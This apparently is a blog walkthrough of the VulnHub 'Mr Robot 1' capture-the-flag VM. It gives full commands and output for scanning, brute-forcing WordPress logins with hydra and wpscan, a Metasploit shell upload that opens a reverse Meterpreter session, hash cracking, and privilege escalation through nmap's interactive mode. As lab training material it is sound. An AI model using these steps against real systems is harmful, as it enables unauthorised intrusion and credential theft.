---
layout: post-detail
title: CTF Walkthrough with mrrobot 1
date: 2018-09-15
catagories: CTF
description: Walkthrough with the CTF mrrobot:https://www.vulnhub.com/entry/mr-robot-1,151
img-url: ''
comments: true
---

# Download the vm:

Download the virtual machine here https://www.vulnhub.com/entry/mr-robot-1,151/

And import it to virtualbox, (File -> Import).

# Discover the network:

    $ ip a | grep inet

```
inet 127.0.0.1/8 scope host lo
inet6 ::1/128 scope host
inet 192.168.2.111/24 brd 192.168.2.255 scope global wlp2s0
inet6 fe80::7082:9eff:fe8b:60b2/64 scope link
```

Target must be located somewhere on 192.168.2.0/24.

# Find our target:

Let's start `nmap` with the `syn scan`:

    $ sudo nmap -sS 192.168.2.0/24

```
Nmap scan report for 192.168.2.106
- - -
MAC Address: 08:00:27:CD:31:B0 (Oracle VirtualBox virtual NIC)
```

So, my target is: `192.168.2.106`, continue with a `tcp` scan with `version`.

    $ sudo nmap -sTV -p- -Pn 192.168.2.106
    
```
22/tcp  closed ssh
80/tcp  open   http   Apache httpd
443/tcp open   ssl/https  Apache httpd
```

We try to found some vulnerability with `nmap --script vuln`:

    $ sudo nmap --script vuln 192.168.2.106

```
http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2
|   /feed/: Wordpress version: 4.3.17
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
```

Nmap found a wordpress site version 4.3.17, a `/robots.txt` and a login page `/wp-login.php`.

    $ w3m http://192.168.2.106/robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

We download these files and found the first key:

    $ wget -cv http://192.168.2.106/fsocity.dic
    $ curl http://192.168.2.106/key-1-of-3.txt | cat
    073403c8a58a1f80d943455fb30724b9

Check what is fsocity.dic:

    $ head -n 5 fsocity.dic

```
true
false
wikia
from
the
```

A dictionary...

    $ wc -l fsocity.dic
    858160

Let's try to reduce this file:

    $ cat fsocity.dic | sort | uniq > fsociety_sort.dic    
    $ wc -l fsociety_sort.dic
    11451

With this new dictionary, it's time to attack the `/wp-login.php`.
Before crack the password with hydra, i capture the POST request with burpsuite and w3m configure with: (into `~/.w3m/config`)

+ use_proxy 1
+ http-proxy `http://127.0.0.1:8080`
+ https-proxy `http://127.0.0.1:8080`

Start `burpsuite` and `w3m http://192.168.2.106/wp-login.php`

Fill the formular and burpsuite return that:

```
POST /wp-login.php HTTP/1.0
---
log=WeirdUsernamel&pwd=WeirdPasswd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.2.106%2Fwp-admin%2F&testcookie=1
```

Rather than attack the page with username and password in the same time (it takes too long), we first, check a valid username like wordpress generate an error when username is good and password not.

    $ hydra -V -L fsociety_sort.dic -p test -f 192.168.2.106 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.2.106%2Fwp-admin%2F&testcookie=1:Bad Loggin' 1&>log.txt

All valid lines contain `http-post-form`:

    $ grep -i http-post-form log.txt

```
[DATA] attacking service http-post-form on port 80
[80][http-post-form] host: 192.168.2.106   login: elliot   password: test
[80][http-post-form] host: 192.168.2.106   login: Elliot   password: test
[80][http-post-form] host: 192.168.2.106   login: ELLIOT   password: test
```

We found the username `elliot`, next, the password...

    $ wpscan -u 192.168.2.106 --username elliot --wordlist ~/fsocity_sort.dic

```
Brute Forcing 'elliot' Time: 00:06:49 <===========            > (5630 / 11452) 49.16%  ETA: 00:07:03
  +----+--------+------+-----------+
  | ID | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+
```

With these informations, we will use the module `wp_admin_shell_upload.rb` from `metasploit`.

Before use, we need to edit the source code and comment one line :)

    $ vim /usr/lib64/metasploit4.16/modules/exploits/unix/webapp/wp_admin_shell_upload.rb

And change the line:

    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?

with:

    #fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?

Save & close the file.

    $ msfconsole
    use exploit/unix/webapp/wp_admin_shell_upload
    show options
    set USERNAME elliot
    set PASSWORD ER28-0652
    set RHOST 192.168.2.106
    run

```
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/qNaWEECiyV/bmiIwZjjty.php...
[*] Sending stage (37775 bytes) to 192.168.2.106
[*] Meterpreter session 1 opened (192.168.2.111:4444 -> 192.168.2.106:56965) at 2018-09-14 19:06:21 +0200
[!] This exploit may require manual cleanup of 'bmiIwZjjty.php' on the target
[!] This exploit may require manual cleanup of 'qNaWEECiyV
.php' on the target
[!] This exploit may require manual cleanup of '../qNaWEECiyV\' on the target
```

Always on msfconsole, navigate on the server.

    meterpreter > sysinfo
    OS: Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64

    meterpreter > cd /home/robot
    meterpreter > ls
    meterpreter > cat password.raw-md5
    robot:c3fcd3d76192e4007dfb496cca67e13b

Open [leaked.py](https://github.com/GitHackTools/Leaked):

    $ leaked.py

```
2, Hash Leaked
Enter or paste a hash code you want to check: c3fcd3d76192e4007dfb496cca67e13b
THAT HASH CODE IS LEAKED! It means: abcdefghijklmnopqrstuvwxyz
```

Return on meterpreter, we going to connect as robot:

    meterpreter > shell
    python -c 'import pty; pty.spawn("/bin/sh")'
    su robot
    Password: abcdefghijklmnopqrstuvwxyz

    cd
    cat key-2-of-3.txt
    822c73956184f694993bede3eb39f959
    
So, the last step is the escalation of privilege. I've test two exploit here for linux 3.13:

    $ searchsploit 3.13
    ---
    Linux Kernel 3.13  | exploits/linux/local/33824.c
    Linux Kernel 3.13. | exploits/linux/local/37292.c
    ---

Into msfconsole:

    meterpreter > cd /tmp
    meterpreter > upload /usr/share/exploitdb/exploits/linux/local/33824.c
    meterpreter > upload /usr/share/exploitdb/exploits/linux/local/37292.c

Next, we have to compile and execute these programs.

    $ gcc 33824.c -o test1
    $ gcc 37292.c -o test2
    $ ./test1
    $ ./test2

But the both exploits failed here so after few minutes on google, that vm have an old version of nmap with a special option `--interactive` who give root access.

    $ find / -perm +6000 2> /dev/null | grep nmap
    $ nmap --interative
    $ !sh
    $ cd /root && cat key-3-of-3.txt
    04787ddef27c3dee1ee161b21670b4e4

